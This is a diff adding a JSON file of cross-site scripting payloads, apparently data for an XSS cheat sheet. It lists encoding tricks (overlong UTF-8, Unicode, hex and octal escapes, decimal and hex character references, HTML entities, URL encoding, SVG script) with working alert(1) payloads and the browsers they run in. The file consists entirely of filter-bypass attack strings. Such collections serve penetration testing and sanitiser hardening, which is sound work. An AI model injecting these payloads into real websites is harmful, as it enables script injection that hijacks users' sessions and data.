@@ -1,0 +1,162 @@
+[
+    {
+        "description": "Overlong UTF-8",
+        "code": "%C0%BCscript>alert(1)<\/script>\n%E0%80%BCscript>alert(1)<\/script>\n%F0%80%80%BCscript>alert(1)<\/script>\n%F8%80%80%80%BCscript>alert(1)<\/script>\n%FC%80%80%80%80%BCscript>alert(1)<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Unicode escapes",
+        "code": "<script>\\u0061lert(1)<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Unicode escapes ES6 style",
+        "code": "<script>\\u{61}lert(1)<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Unicode escapes ES6 style zero padded",
+        "code": "<script>\\u{0000000061}lert(1)<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hex encoding",
+        "code": "<script>eval('\\x61lert(1)')<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Octal encoding",
+        "code": "<script>eval('\\141lert(1)')<\/script>\n<script>eval('alert(\\061)')<\/script>\n<script>eval('alert(\\61)')<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Decimal encoding with optional semi-colon",
+        "code": "<a href=\"&#106;avascript:alert(1)\">XSS<\/a><a href=\"&#106avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "SVG script with HTML encoding",
+        "code": "<svg><script>&#97;lert(1)<\/script><\/svg>\n<svg><script>&#x61;lert(1)<\/script><\/svg>\n<svg><script>alert&NewLine;(1)<\/script><\/svg>\n<svg><script>x=\"&quot;,alert(1)\/\/\";<\/script><\/svg>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Decimal encoding with padded zeros",
+        "code": "<a href=\"&#0000106avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hex encoding",
+        "code": "<a href=\"&#x6a;avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hex encoding without semi-colon provided next character is not a-f0-9",
+        "code": "<a href=\"j&#x61vascript:alert(1)\">XSS<\/a>\n<a href=\"&#x6a\navascript:alert(1)\">XSS<\/a>\n<a href=\"&#x6a avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hex encoding with padded zeros",
+        "code": "<a href=\"&#x0000006a;avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "Hex encoding is not case sensitive",
+        "code": "<a href=\"&#X6A;avascript:alert(1)\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "HTML entities",
+        "code": "<a href=\"javascript&colon;alert(1)\">XSS<\/a>\n<a href=\"java&Tab;script:alert(1)\">XSS<\/a>\n<a href=\"java&NewLine;script:alert(1)\">XSS<\/a>\n<a href=\"javascript&colon;alert&lpar;1&rpar;\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "URL encoding",
+        "code": "<a href=\"javascript:x='%27-alert(1)-%27';\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "HTML entities and URL encoding",
+        "code": "<a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS<\/a>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    }
+]
